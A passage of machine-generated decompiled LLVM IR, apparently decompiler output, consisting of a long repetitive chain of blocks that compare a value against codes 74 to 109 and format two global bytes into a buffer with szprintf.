  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_baf4, i32 ptrtoint ([12 x i8]* @global_var_32a9c.231 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_a984, 74
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v2_bb28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb34 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bb40 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_bb28, i32 ptrtoint ([12 x i8]* @global_var_32aa8.233 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_a984, 75
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v2_bb5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb68 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bb74 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_bb5c, i32 ptrtoint ([13 x i8]* @global_var_32ab4.235 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_a984, 76
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v2_bb90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb9c = load i8, i8* @global_var_42c78.78, align 1
  %v3_bba8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_bb90, i32 ptrtoint ([13 x i8]* @global_var_32ac4.237 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_a984, 77
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v2_bbc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbd0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bbdc = load i8, i8* @global_var_42c79.79, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_bbc4, i32 ptrtoint ([13 x i8]* @global_var_32ad4.239 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_a984, 78
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v2_bbf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc04 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bc10 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_bbf8, i32 ptrtoint ([13 x i8]* @global_var_32ae4.241 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_a984, 79
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v2_bc2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc38 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bc44 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_bc2c, i32 ptrtoint ([13 x i8]* @global_var_32af4.243 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_a984, 80
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc88

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v2_bc60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc6c = load i8, i8* @global_var_42c78.78, align 1
  %v3_bc78 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bc84 = sext i8 %v3_bc6c to i32
  %v6_bc84 = sext i8 %v3_bc78 to i32
  %v8_bc84 = call i32 @szprintf(i32 %v2_bc60, i32 ptrtoint ([12 x i8]* @global_var_32b04.245 to i32), i32 %v4_bc84, i32 %v6_bc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_bc8c = icmp eq i32 %v2_a984, 81
  br i1 %v7_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_bcbc

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc88
  %v2_bc94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bca0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bcac = load i8, i8* @global_var_42c79.79, align 1
  %v4_bcb8 = sext i8 %v3_bca0 to i32
  %v6_bcb8 = sext i8 %v3_bcac to i32
  %v8_bcb8 = call i32 @szprintf(i32 %v2_bc94, i32 ptrtoint ([13 x i8]* @global_var_32b10.247 to i32), i32 %v4_bcb8, i32 %v6_bcb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bc94
  %v7_bcc0 = icmp eq i32 %v2_a984, 82
  br i1 %v7_bcc0, label %dec_label_pc_bcc8, label %dec_label_pc_bcf0

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcbc
  %v2_bcc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcd4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bce0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bcec = sext i8 %v3_bcd4 to i32
  %v6_bcec = sext i8 %v3_bce0 to i32
  %v8_bcec = call i32 @szprintf(i32 %v2_bcc8, i32 ptrtoint ([13 x i8]* @global_var_32b20.249 to i32), i32 %v4_bcec, i32 %v6_bcec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcf0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcbc, %dec_label_pc_bcc8
  %v7_bcf4 = icmp eq i32 %v2_a984, 83
  br i1 %v7_bcf4, label %dec_label_pc_bcfc, label %dec_label_pc_bd24

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcf0
  %v2_bcfc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd08 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bd14 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bd20 = sext i8 %v3_bd08 to i32
  %v6_bd20 = sext i8 %v3_bd14 to i32
  %v8_bd20 = call i32 @szprintf(i32 %v2_bcfc, i32 ptrtoint ([14 x i8]* @global_var_32b30.251 to i32), i32 %v4_bd20, i32 %v6_bd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bcfc
  %v7_bd28 = icmp eq i32 %v2_a984, 84
  br i1 %v7_bd28, label %dec_label_pc_bd30, label %dec_label_pc_bd58

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd24
  %v2_bd30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd3c = load i8, i8* @global_var_42c78.78, align 1
  %v3_bd48 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bd54 = sext i8 %v3_bd3c to i32
  %v6_bd54 = sext i8 %v3_bd48 to i32
  %v8_bd54 = call i32 @szprintf(i32 %v2_bd30, i32 ptrtoint ([14 x i8]* @global_var_32b40.253 to i32), i32 %v4_bd54, i32 %v6_bd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd24, %dec_label_pc_bd30
  %v7_bd5c = icmp eq i32 %v2_a984, 85
  br i1 %v7_bd5c, label %dec_label_pc_bd64, label %dec_label_pc_bd8c

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd58
  %v2_bd64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd70 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bd7c = load i8, i8* @global_var_42c79.79, align 1
  %v4_bd88 = sext i8 %v3_bd70 to i32
  %v6_bd88 = sext i8 %v3_bd7c to i32
  %v8_bd88 = call i32 @szprintf(i32 %v2_bd64, i32 ptrtoint ([14 x i8]* @global_var_32b50.255 to i32), i32 %v4_bd88, i32 %v6_bd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd58, %dec_label_pc_bd64
  %v7_bd90 = icmp eq i32 %v2_a984, 86
  br i1 %v7_bd90, label %dec_label_pc_bd98, label %dec_label_pc_bdc0

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bd8c
  %v2_bd98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bda4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bdb0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bdbc = sext i8 %v3_bda4 to i32
  %v6_bdbc = sext i8 %v3_bdb0 to i32
  %v8_bdbc = call i32 @szprintf(i32 %v2_bd98, i32 ptrtoint ([14 x i8]* @global_var_32b60.257 to i32), i32 %v4_bdbc, i32 %v6_bdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_bd98
  %v7_bdc4 = icmp eq i32 %v2_a984, 87
  br i1 %v7_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdf4

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdc0
  %v2_bdcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdd8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bde4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bdf0 = sext i8 %v3_bdd8 to i32
  %v6_bdf0 = sext i8 %v3_bde4 to i32
  %v8_bdf0 = call i32 @szprintf(i32 %v2_bdcc, i32 ptrtoint ([14 x i8]* @global_var_32b70.259 to i32), i32 %v4_bdf0, i32 %v6_bdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdcc
  %v7_bdf8 = icmp eq i32 %v2_a984, 88
  br i1 %v7_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be28

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdf4
  %v2_be00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be0c = load i8, i8* @global_var_42c78.78, align 1
  %v3_be18 = load i8, i8* @global_var_42c79.79, align 1
  %v4_be24 = sext i8 %v3_be0c to i32
  %v6_be24 = sext i8 %v3_be18 to i32
  %v8_be24 = call i32 @szprintf(i32 %v2_be00, i32 ptrtoint ([14 x i8]* @global_var_32b80.261 to i32), i32 %v4_be24, i32 %v6_be24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be28

dec_label_pc_be28:                                ; preds = %dec_label_pc_bdf4, %dec_label_pc_be00
  %v7_be2c = icmp eq i32 %v2_a984, 89
  br i1 %v7_be2c, label %dec_label_pc_be34, label %dec_label_pc_be5c

dec_label_pc_be34:                                ; preds = %dec_label_pc_be28
  %v2_be34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be40 = load i8, i8* @global_var_42c78.78, align 1
  %v3_be4c = load i8, i8* @global_var_42c79.79, align 1
  %v4_be58 = sext i8 %v3_be40 to i32
  %v6_be58 = sext i8 %v3_be4c to i32
  %v8_be58 = call i32 @szprintf(i32 %v2_be34, i32 ptrtoint ([14 x i8]* @global_var_32b90.263 to i32), i32 %v4_be58, i32 %v6_be58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be28, %dec_label_pc_be34
  %v7_be60 = icmp eq i32 %v2_a984, 90
  br i1 %v7_be60, label %dec_label_pc_be68, label %dec_label_pc_be90

dec_label_pc_be68:                                ; preds = %dec_label_pc_be5c
  %v2_be68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be74 = load i8, i8* @global_var_42c78.78, align 1
  %v3_be80 = load i8, i8* @global_var_42c79.79, align 1
  %v4_be8c = sext i8 %v3_be74 to i32
  %v6_be8c = sext i8 %v3_be80 to i32
  %v8_be8c = call i32 @szprintf(i32 %v2_be68, i32 ptrtoint ([14 x i8]* @global_var_32ba0.265 to i32), i32 %v4_be8c, i32 %v6_be8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_be68
  %v7_be94 = icmp eq i32 %v2_a984, 91
  br i1 %v7_be94, label %dec_label_pc_be9c, label %dec_label_pc_bec4

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be90
  %v2_be9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bea8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_beb4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bec0 = sext i8 %v3_bea8 to i32
  %v6_bec0 = sext i8 %v3_beb4 to i32
  %v8_bec0 = call i32 @szprintf(i32 %v2_be9c, i32 ptrtoint ([14 x i8]* @global_var_32bb0.267 to i32), i32 %v4_bec0, i32 %v6_bec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be90, %dec_label_pc_be9c
  %v7_bec8 = icmp eq i32 %v2_a984, 92
  br i1 %v7_bec8, label %dec_label_pc_bed0, label %dec_label_pc_bef8

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bec4
  %v2_bed0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bedc = load i8, i8* @global_var_42c78.78, align 1
  %v3_bee8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bef4 = sext i8 %v3_bedc to i32
  %v6_bef4 = sext i8 %v3_bee8 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_bed0, i32 ptrtoint ([14 x i8]* @global_var_32bc0.269 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bec4, %dec_label_pc_bed0
  %v7_befc = icmp eq i32 %v2_a984, 93
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v2_bf04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf10 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bf1c = load i8, i8* @global_var_42c79.79, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_bf04, i32 ptrtoint ([14 x i8]* @global_var_32bd0.271 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_a984, 94
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v2_bf38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf44 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bf50 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
  %v8_bf5c = call i32 @szprintf(i32 %v2_bf38, i32 ptrtoint ([14 x i8]* @global_var_32be0.273 to i32), i32 %v4_bf5c, i32 %v6_bf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bf38
  %v7_bf64 = icmp eq i32 %v2_a984, 95
  br i1 %v7_bf64, label %dec_label_pc_bf6c, label %dec_label_pc_bf94

dec_label_pc_bf6c:                                ; preds = %dec_label_pc_bf60
  %v2_bf6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf78 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bf84 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bf90 = sext i8 %v3_bf78 to i32
  %v6_bf90 = sext i8 %v3_bf84 to i32
  %v8_bf90 = call i32 @szprintf(i32 %v2_bf6c, i32 ptrtoint ([14 x i8]* @global_var_32bf0.275 to i32), i32 %v4_bf90, i32 %v6_bf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf60, %dec_label_pc_bf6c
  %v7_bf98 = icmp eq i32 %v2_a984, 96
  br i1 %v7_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc8

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94
  %v2_bfa0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfac = load i8, i8* @global_var_42c78.78, align 1
  %v3_bfb8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_bfc4 = sext i8 %v3_bfac to i32
  %v6_bfc4 = sext i8 %v3_bfb8 to i32
  %v8_bfc4 = call i32 @szprintf(i32 %v2_bfa0, i32 ptrtoint ([14 x i8]* @global_var_32c00.277 to i32), i32 %v4_bfc4, i32 %v6_bfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bfa0
  %v7_bfcc = icmp eq i32 %v2_a984, 97
  br i1 %v7_bfcc, label %dec_label_pc_bfd4, label %dec_label_pc_bffc

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc8
  %v2_bfd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfe0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_bfec = load i8, i8* @global_var_42c79.79, align 1
  %v4_bff8 = sext i8 %v3_bfe0 to i32
  %v6_bff8 = sext i8 %v3_bfec to i32
  %v8_bff8 = call i32 @szprintf(i32 %v2_bfd4, i32 ptrtoint ([13 x i8]* @global_var_32c10.279 to i32), i32 %v4_bff8, i32 %v6_bff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfd4
  %v7_c000 = icmp eq i32 %v2_a984, 98
  br i1 %v7_c000, label %dec_label_pc_c008, label %dec_label_pc_c030

dec_label_pc_c008:                                ; preds = %dec_label_pc_bffc
  %v2_c008 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c014 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c020 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c02c = sext i8 %v3_c014 to i32
  %v6_c02c = sext i8 %v3_c020 to i32
  %v8_c02c = call i32 @szprintf(i32 %v2_c008, i32 ptrtoint ([13 x i8]* @global_var_32c20.281 to i32), i32 %v4_c02c, i32 %v6_c02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_bffc, %dec_label_pc_c008
  %v7_c034 = icmp eq i32 %v2_a984, 99
  br i1 %v7_c034, label %dec_label_pc_c03c, label %dec_label_pc_c064

dec_label_pc_c03c:                                ; preds = %dec_label_pc_c030
  %v2_c03c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c048 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c054 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c060 = sext i8 %v3_c048 to i32
  %v6_c060 = sext i8 %v3_c054 to i32
  %v8_c060 = call i32 @szprintf(i32 %v2_c03c, i32 ptrtoint ([14 x i8]* @global_var_32c30.283 to i32), i32 %v4_c060, i32 %v6_c060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c030, %dec_label_pc_c03c
  %v7_c068 = icmp eq i32 %v2_a984, 100
  br i1 %v7_c068, label %dec_label_pc_c070, label %dec_label_pc_c098

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064
  %v2_c070 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c07c = load i8, i8* @global_var_42c78.78, align 1
  %v3_c088 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c094 = sext i8 %v3_c07c to i32
  %v6_c094 = sext i8 %v3_c088 to i32
  %v8_c094 = call i32 @szprintf(i32 %v2_c070, i32 ptrtoint ([14 x i8]* @global_var_32c40.285 to i32), i32 %v4_c094, i32 %v6_c094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c070
  %v7_c09c = icmp eq i32 %v2_a984, 101
  br i1 %v7_c09c, label %dec_label_pc_c0a4, label %dec_label_pc_c0cc

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c098
  %v2_c0a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0b0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c0bc = load i8, i8* @global_var_42c79.79, align 1
  %v4_c0c8 = sext i8 %v3_c0b0 to i32
  %v6_c0c8 = sext i8 %v3_c0bc to i32
  %v8_c0c8 = call i32 @szprintf(i32 %v2_c0a4, i32 ptrtoint ([14 x i8]* @global_var_32c50.287 to i32), i32 %v4_c0c8, i32 %v6_c0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c098, %dec_label_pc_c0a4
  %v7_c0d0 = icmp eq i32 %v2_a984, 102
  br i1 %v7_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c100

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0cc
  %v2_c0d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0e4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c0f0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c0fc = sext i8 %v3_c0e4 to i32
  %v6_c0fc = sext i8 %v3_c0f0 to i32
  %v8_c0fc = call i32 @szprintf(i32 %v2_c0d8, i32 ptrtoint ([14 x i8]* @global_var_32c60.289 to i32), i32 %v4_c0fc, i32 %v6_c0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d8
  %v7_c104 = icmp eq i32 %v2_a984, 103
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100
  %v2_c10c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c118 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c124 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c130 = sext i8 %v3_c118 to i32
  %v6_c130 = sext i8 %v3_c124 to i32
  %v8_c130 = call i32 @szprintf(i32 %v2_c10c, i32 ptrtoint ([14 x i8]* @global_var_32c70.291 to i32), i32 %v4_c130, i32 %v6_c130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c10c
  %v7_c138 = icmp eq i32 %v2_a984, 104
  br i1 %v7_c138, label %dec_label_pc_c140, label %dec_label_pc_c168

dec_label_pc_c140:                                ; preds = %dec_label_pc_c134
  %v2_c140 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c14c = load i8, i8* @global_var_42c78.78, align 1
  %v3_c158 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c164 = sext i8 %v3_c14c to i32
  %v6_c164 = sext i8 %v3_c158 to i32
  %v8_c164 = call i32 @szprintf(i32 %v2_c140, i32 ptrtoint ([14 x i8]* @global_var_32c80.293 to i32), i32 %v4_c164, i32 %v6_c164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c134, %dec_label_pc_c140
  %v7_c16c = icmp eq i32 %v2_a984, 105
  br i1 %v7_c16c, label %dec_label_pc_c174, label %dec_label_pc_c19c

dec_label_pc_c174:                                ; preds = %dec_label_pc_c168
  %v2_c174 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c180 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c18c = load i8, i8* @global_var_42c79.79, align 1
  %v4_c198 = sext i8 %v3_c180 to i32
  %v6_c198 = sext i8 %v3_c18c to i32
  %v8_c198 = call i32 @szprintf(i32 %v2_c174, i32 ptrtoint ([14 x i8]* @global_var_32c90.295 to i32), i32 %v4_c198, i32 %v6_c198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v7_c1a0 = icmp eq i32 %v2_a984, 106
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c1d0

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c19c
  %v2_c1a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1b4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c1c0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c1cc = sext i8 %v3_c1b4 to i32
  %v6_c1cc = sext i8 %v3_c1c0 to i32
  %v8_c1cc = call i32 @szprintf(i32 %v2_c1a8, i32 ptrtoint ([14 x i8]* @global_var_32ca0.297 to i32), i32 %v4_c1cc, i32 %v6_c1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c1a8
  %v7_c1d4 = icmp eq i32 %v2_a984, 107
  br i1 %v7_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c204

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1d0
  %v2_c1dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1e8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_c1f4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c200 = sext i8 %v3_c1e8 to i32
  %v6_c200 = sext i8 %v3_c1f4 to i32
  %v8_c200 = call i32 @szprintf(i32 %v2_c1dc, i32 ptrtoint ([13 x i8]* @global_var_32cb0.299 to i32), i32 %v4_c200, i32 %v6_c200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c1dc
  %v7_c208 = icmp eq i32 %v2_a984, 108
  br i1 %v7_c208, label %dec_label_pc_c210, label %dec_label_pc_c238

dec_label_pc_c210:                                ; preds = %dec_label_pc_c204
  %v2_c210 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c21c = load i8, i8* @global_var_42c78.78, align 1
  %v3_c228 = load i8, i8* @global_var_42c79.79, align 1
  %v4_c234 = sext i8 %v3_c21c to i32
  %v6_c234 = sext i8 %v3_c228 to i32
  %v8_c234 = call i32 @szprintf(i32 %v2_c210, i32 ptrtoint ([12 x i8]* @global_var_32cc0.301 to i32), i32 %v4_c234, i32 %v6_c234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c210
  %v7_c23c = icmp eq i32 %v2_a984, 109
  br i1 %v7_c23c, label %dec_label_pc_c244, label %dec_label_pc_c26c

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238
  %v2_c244 = ptrtoint i32* %stack_var_-36 to i32
